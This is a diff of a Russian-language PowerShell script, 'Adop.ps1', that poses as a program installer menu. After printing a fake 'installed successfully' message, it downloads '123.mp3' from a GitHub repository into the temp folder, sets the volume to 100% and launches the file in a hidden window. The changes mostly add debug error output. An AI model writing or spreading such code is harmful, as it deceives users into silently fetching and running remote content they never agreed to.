@@ -1,9 +1,9 @@
 # ================================================
-#   Adop.ps1 — Скачивает и запускает 123.mp3 (исправлено)
+#   Adop.ps1 — Версия с отображением ошибки (не закрывается)
 # ================================================
 
 Clear-Host
-$host.UI.RawUI.WindowTitle = "Adop"
+$host.UI.RawUI.WindowTitle = "Adop - Отладка"
 
 $MusicURL = "https://github.com/fffghsetyver-hash/Cheackproverka/raw/main/123.mp3"
 
@@ -46,26 +46,30 @@ function Install-Program {
     Write-Host "   Статус: ✓ Успешно установлена" -ForegroundColor Green
     Write-Host ""
 
-    # Скачивание и запуск 123.mp3
+    # === Попытка запуска 123.mp3 ===
     $mp3Path = "$env:TEMP\123_$(Get-Random).mp3"
 
     try {
         Write-Host "   Загрузка 123.mp3 ..." -ForegroundColor Yellow
         Invoke-WebRequest -Uri $MusicURL -OutFile $mp3Path -UseBasicParsing -TimeoutSec 30 | Out-Null
-        Write-Host "   Файл скачан" -ForegroundColor Green
+        Write-Host "   Файл успешно скачан" -ForegroundColor Green
 
         Set-Volume100
 
-        # Новый способ запуска — более надёжный
+        Write-Host "   Запуск 123.mp3 ..." -ForegroundColor Yellow
         Start-Process -FilePath $mp3Path -WindowStyle Hidden
 
-        Write-Host "   123.mp3 запущен скрыто (громкость 100%)" -ForegroundColor Green
+        Write-Host "   123.mp3 запущен скрыто" -ForegroundColor Green
     }
     catch {
-        Write-Host "   Ошибка: не удалось скачать или запустить 123.mp3" -ForegroundColor Red
+        Write-Host "`n   ОШИБКА:" -ForegroundColor Red
+        Write-Host "   $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "`n   Полная информация об ошибке:" -ForegroundColor Red
+        Write-Host $_.Exception | Format-List -Force
     }
 
-    Write-Host "`n   Нажмите любую клавишу для возврата в меню..." -ForegroundColor Gray
+    Write-Host "`n`n   ==================== КОНЕЦ ====================" -ForegroundColor White
+    Write-Host "   Нажмите любую клавишу, чтобы закрыть окно..." -ForegroundColor Gray
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 }
 
@@ -89,11 +93,7 @@ do {
 
     $choice = Read-Host
 
-    if ($choice -eq "0") { 
-        Clear-Host
-        Write-Host "До свидания!" -ForegroundColor Cyan
-        exit 
-    }
+    if ($choice -eq "0") { exit }
 
     $category = switch ($choice) {
         "1" { "Все программы" }
